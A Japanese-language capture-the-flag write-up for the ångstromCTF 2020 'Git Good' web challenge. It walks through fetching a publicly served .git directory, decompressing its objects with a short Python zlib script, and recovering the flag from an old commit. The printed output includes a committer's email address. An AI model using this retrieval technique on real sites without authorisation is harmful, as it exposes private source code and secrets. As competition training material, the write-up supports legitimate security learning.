# Git Good:Web:70pts
Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed [a very work in progress challenge](https://gitgood.2020.chall.actf.co/) so I thought it was worth sharing.  
Hint  
Static file serving is a very dangerous thing when in the wrong directory.  

# Solution
はじめにhttps://gitgood.2020.chall.actf.co/.git/HEADにアクセスする。  
config、descriptionと順に見ていくがflagは無いようである。  
つぎにhttps://gitgood.2020.chall.actf.co/.git/logs/HEADを取得する。  
上記ファイルから以下のハッシュを取得できる  
```text
6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
e975d678f209da09fff763cd297a6ed8dd77bb35
```
./git/objectsの構成は先頭二桁がディレクトリ名に、残りがファイル名になる。  
https://gitgood.2020.chall.actf.co/.git/objects/6b/3c94c0b90a897f246f0f32dec3f5fd3e40abb5  
https://gitgood.2020.chall.actf.co/.git/objects/e9/75d678f209da09fff763cd297a6ed8dd77bb35  
上記ファイルを共に取得し、zlib_dec.pyでzlib.decompressを行う。  
```python:zlib_dec.py
import zlib

f1 = open("3c94c0b90a897f246f0f32dec3f5fd3e40abb5")
f2 = open("75d678f209da09fff763cd297a6ed8dd77bb35")
print(zlib.decompress(f1.read()))
print(zlib.decompress(f2.read()))
f1.close()
f2.close()
```
```text:出力
commit 210 tree b630430d9d393a6b143af2839fd24ac2118dba79
author aplet123 <noneof@your.business> 1583598444 +0000
committer aplet123 <jasonqan2004@gmail.com> 1583598444 +0000

haha I lied this is the actual initial commit

commit 227 tree 9402d143d3d7998247c95597b63598ce941e7bcb
parent 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
author aplet123 <noneof@your.business> 1583598464 +0000
committer aplet123 <jasonqan2004@gmail.com> 1583598464 +0000

Initial commit

```
これによりさらに以下のハッシュを取得できる。  
```text
b630430d9d393a6b143af2839fd24ac2118dba79
9402d143d3d7998247c95597b63598ce941e7bcb
```
再度./git/objectsを見に行き、zlib.decompressを行う。  
https://gitgood.2020.chall.actf.co/.git/objects/b6/30430d9d393a6b143af2839fd24ac2118dba79  
https://gitgood.2020.chall.actf.co/.git/objects/94/02d143d3d7998247c95597b63598ce941e7bcb  
```python:zlib_dec.py(差分)
f1 = open("30430d9d393a6b143af2839fd24ac2118dba79")
f2 = open("02d143d3d7998247c95597b63598ce941e7bcb")
```
treeなのでファイルにリダイレクト(tree)してバイナリエディタなどで見ると分かりやすい。  
thisistheflag.txtなるものがあるようだ。  
```text
0f52598006f9cdb21db2f4c8d44d70535630289b
247c9d491c0d2d6da5e93afcd0681b3edd7ccd70
```
ハッシュが取得できるので同様にzlib.decompress。
https://gitgood.2020.chall.actf.co/.git/objects/0f/52598006f9cdb21db2f4c8d44d70535630289b  
https://gitgood.2020.chall.actf.co/.git/objects/24/7c9d491c0d2d6da5e93afcd0681b3edd7ccd70  
```python:zlib_dec.py(差分2)
f1 = open("52598006f9cdb21db2f4c8d44d70535630289b")
f2 = open("7c9d491c0d2d6da5e93afcd0681b3edd7ccd70")
```
```text:出力2
blob 75 actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}

btw this isn't the actual git server

blob 32 There used to be a flag here...

```

## actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}